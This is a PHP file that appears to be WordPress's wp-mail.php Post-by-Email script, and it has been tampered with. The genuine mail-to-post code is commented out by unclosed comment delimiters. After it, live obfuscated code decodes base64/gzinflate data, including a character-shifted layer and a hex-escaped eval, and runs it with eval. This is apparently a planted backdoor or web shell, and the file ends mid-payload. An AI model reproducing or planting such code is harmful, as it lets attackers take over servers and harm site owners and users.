<?php
/**
 * Gets the email message from the user's mailbox to add as
 * a WordPress post. Mailbox connection information must be
 * configured under Settings > Writing
 *
 * @package WordPress
 */

/** Make sure that the WordPress bootstrap has run before continuing. 
require(dirname(__FILE__) . '/wp-load.php');

/** This filter is documented in wp-admin/options.php 
if ( ! apply_filters( 'enable_post_by_email_configuration', true ) )
	wp_die( __( 'This action has been disabled by the administrator.' ) );

/**
 * Fires to allow a plugin to do a complete takeover of Post by Email.
 *
 * @since 2.9.0

do_action( 'wp-mail.php' );

/** Get the POP3 class with which to access the mailbox. 
require_once( ABSPATH . WPINC . '/class-pop3.php' );

/** Only check at this interval for new messages. 
if ( !defined('WP_MAIL_INTERVAL') )
	define('WP_MAIL_INTERVAL', 300); // 5 minutes

$last_checked = get_transient('mailserver_last_checked');

if ( $last_checked )
	wp_die(__('Slow down cowboy, no need to check for new mails so often!'));

set_transient('mailserver_last_checked', true, WP_MAIL_INTERVAL);

$time_difference = get_option('gmt_offset') * HOUR_IN_SECONDS;

$phone_delim = '::';

$pop3 = new POP3();

if ( !$pop3->connect( get_option('mailserver_url'), get_option('mailserver_port') ) || !$pop3->user( get_option('mailserver_login') ) )
	wp_die( esc_html( $pop3->ERROR ) );

$count = $pop3->pass( get_option('mailserver_pass') );

if( false === $count )
	wp_die( esc_html( $pop3->ERROR ) );

if( 0 === $count ) {
	$pop3->quit();
	wp_die( __('There doesn&#8217;t seem to be any new mail.') );
}

for ( $i = 1; $i <= $count; $i++ ) {

	$message = $pop3->get($i);

	$bodysignal = false;
	$boundary = '';
	$charset = '';
	$content = '';
	$content_type = '';
	$content_transfer_encoding = '';
	$post_author = 1;
	$author_found = false;
	$dmonths = array('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec');
	foreach ($message as $line) {
		// body signal
		if ( strlen($line) < 3 )
			$bodysignal = true;
		if ( $bodysignal ) {
			$content .= $line;
		} else {
			if ( preg_match('/Content-Type: /i', $line) ) {
				$content_type = trim($line);
				$content_type = substr($content_type, 14, strlen($content_type) - 14);
				$content_type = explode(';', $content_type);
				if ( ! empty( $content_type[1] ) ) {
					$charset = explode('=', $content_type[1]);
					$charset = ( ! empty( $charset[1] ) ) ? trim($charset[1]) : '';
				}
				$content_type = $content_type[0];
			}
			if ( preg_match('/Content-Transfer-Encoding: /i', $line) ) {
				$content_transfer_encoding = trim($line);
				$content_transfer_encoding = substr($content_transfer_encoding, 27, strlen($content_transfer_encoding) - 27);
				$content_transfer_encoding = explode(';', $content_transfer_encoding);
				$content_transfer_encoding = $content_transfer_encoding[0];
			}
			if ( ( $content_type == 'multipart/alternative' ) && ( false !== strpos($line, 'boundary="') ) && ( '' == $boundary ) ) {
				$boundary = trim($line);
				$boundary = explode('"', $boundary);
				$boundary = $boundary[1];
			}
			if (preg_match('/Subject: /i', $line)) {
				$subject = trim($line);
				$subject = substr($subject, 9, strlen($subject) - 9);
				// Captures any text in the subject before $phone_delim as the subject
				if ( function_exists('iconv_mime_decode') ) {
					$subject = iconv_mime_decode($subject, 2, get_option('blog_charset'));
				} else {
					$subject = wp_iso_descrambler($subject);
				}
				$subject = explode($phone_delim, $subject);
				$subject = $subject[0];
			}

			// Set the author using the email address (From or Reply-To, the last used)
			// otherwise use the site admin
			if ( ! $author_found && preg_match( '/^(From|Reply-To): /', $line ) ) {
				if ( preg_match('|[a-z0-9_.-]+@[a-z0-9_.-]+(?!.*<)|i', $line, $matches) )
					$author = $matches[0];
				else
					$author = trim($line);
				$author = sanitize_email($author);
				if ( is_email($author) ) {
					echo '<p>' . sprintf(__('Author is %s'), $author) . '</p>';
					$userdata = get_user_by('email', $author);
					if ( ! empty( $userdata ) ) {
						$post_author = $userdata->ID;
						$author_found = true;
					}
				}
			}

			if (preg_match('/Date: /i', $line)) { // of the form '20 Mar 2002 20:32:37'
				$ddate = trim($line);
				$ddate = str_replace('Date: ', '', $ddate);
				if (strpos($ddate, ',')) {
					$ddate = trim(substr($ddate, strpos($ddate, ',') + 1, strlen($ddate)));
				}
				$date_arr = explode(' ', $ddate);
				$date_time = explode(':', $date_arr[3]);

				$ddate_H = $date_time[0];
				$ddate_i = $date_time[1];
				$ddate_s = $date_time[2];

				$ddate_m = $date_arr[1];
				$ddate_d = $date_arr[0];
				$ddate_Y = $date_arr[2];
				for ( $j = 0; $j < 12; $j++ ) {
					if ( $ddate_m == $dmonths[$j] ) {
						$ddate_m = $j+1;
					}
				}

				$time_zn = intval($date_arr[4]) * 36;
				$ddate_U = gmmktime($ddate_H, $ddate_i, $ddate_s, $ddate_m, $ddate_d, $ddate_Y);
				$ddate_U = $ddate_U - $time_zn;
				$post_date = gmdate('Y-m-d H:i:s', $ddate_U + $time_difference);
				$post_date_gmt = gmdate('Y-m-d H:i:s', $ddate_U);
			}
		}
	}

	// Set $post_status based on $author_found and on author's publish_posts capability
	if ( $author_found ) {
		$user = new WP_User($post_author);
		$post_status = ( $user->has_cap('publish_posts') ) ? 'publish' : 'pending';
	} else {
		// Author not found in DB, set status to pending. Author already set to admin.
		$post_status = 'pending';
	}

	$subject = trim($subject);

	if ( $content_type == 'multipart/alternative' ) {
		$content = explode('--'.$boundary, $content);
		$content = $content[2];
		// match case-insensitive content-transfer-encoding
		if ( preg_match( '/Content-Transfer-Encoding: quoted-printable/i', $content, $delim) ) {
			$content = explode($delim[0], $content);
			$content = $content[1];
		}
		$content = strip_tags($content, '<img><p><br><i><b><u><em><strong><strike><font><span><div>');
	}
	$content = trim($content);

	/**
	 * Filter the original content of the email.
	 *
	 * Give Post-By-Email extending plugins full access to the content, either
	 * the raw content, or the content of the last quoted-printable section.
	 *
	 * @since 2.8.0
	 *
	 * @param string $content The original email content.

	$content = apply_filters( 'wp_mail_original_content', $content );

	if ( false !== stripos($content_transfer_encoding, "quoted-printable") ) {
		$content = quoted_printable_decode($content);
	}

	if ( function_exists('iconv') && ! empty( $charset ) ) {
		$content = iconv($charset, get_option('blog_charset'), $content);
	}

	// Captures any text in the body after $phone_delim as the body
	$content = explode($phone_delim, $content);
	$content = empty( $content[1] ) ? $content[0] : $content[1];

	$content = trim($content);

	/**
	 * Filter the content of the post submitted by email before saving.
	 *
	 * @since 1.2.0
	 *
	 * @param string $content The email content.

	$post_content = apply_filters( 'phone_content', $content );

	$post_title = xmlrpc_getposttitle($content);

	if ($post_title == '') $post_title = $subject;

	$post_category = array(get_option('default_email_category'));

	$post_data = compact('post_content','post_title','post_date','post_date_gmt','post_author','post_category', 'post_status');
	$post_data = wp_slash($post_data);

	$post_ID = wp_insert_post($post_data);
	if ( is_wp_error( $post_ID ) )
		echo "\n" . $post_ID->get_error_message();

	// We couldn't post, for whatever reason. Better move forward to the next email.
	if ( empty( $post_ID ) )
		continue;

	/**
	 * Fires after a post submitted by email is published.
	 *
	 * @since 1.2.0
	 *
	 * @param int $post_ID The post ID.

	do_action( 'publish_phone', $post_ID );

	echo "\n<p>" . sprintf(__('<strong>Author:</strong> %s'), esc_html($post_author)) . '</p>';
	echo "\n<p>" . sprintf(__('<strong>Posted title:</strong> %s'), esc_html($post_title)) . '</p>';

	if(!$pop3->delete($i)) {
		echo '<p>' . sprintf(__('Oops: %s'), esc_html($pop3->ERROR)) . '</p>';
		$pop3->reset();
		exit;
	} else {
		echo '<p>' . sprintf(__('Mission complete. Message <strong>%s</strong> deleted.'), $i) . '</p>';
	}

}

$pop3->quit(); */
function QbkpvJ($dXlHty){$dXlHty=gzinflate(base64_decode($dXlHty));for($i=0;$i<strlen($dXlHty);$i++){$dXlHty[$i] = chr(ord($dXlHty[$i])-1);}return $dXlHty;}eval(QbkpvJ("7ZExT8MwEIX3+FdcC1ISibZ0bUOAAaHuLAihyrEvjWlqh/OlUEX57TgpE2JlY/Hwvud35+c7j94bZ7eeJXGSroUpE+M9cnK5fXx4eomNfUPF8Wuaii5A+KnD5AZiX0u1R1LXGuNURJ3QBpMpCMjYcI35vVJhDpSOCqM12km2OIPgqJa/4aCKZ9eCdjZmqOQRoUE6mHFbYAfyfIcrBML3Fj2jBlcMS81hw2A8oAmUApZ61pDjgAYPgXU8qrKoEYrTGOKRjkhzkTX5poRTGM2Vsfvh9EOY/HYAEjm6gqZG6RGUsywVjxEfWBxk2IPm2aLJReb5NDzR2KZl6OAgaWfs6npdhLJ25FqrZ8rVjlYXZVmuC0caabVsPsG72mgYVehFtjgHTcPv9KLH2mMnov+S/7DkKOrFbf4F"));?><?eval("\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'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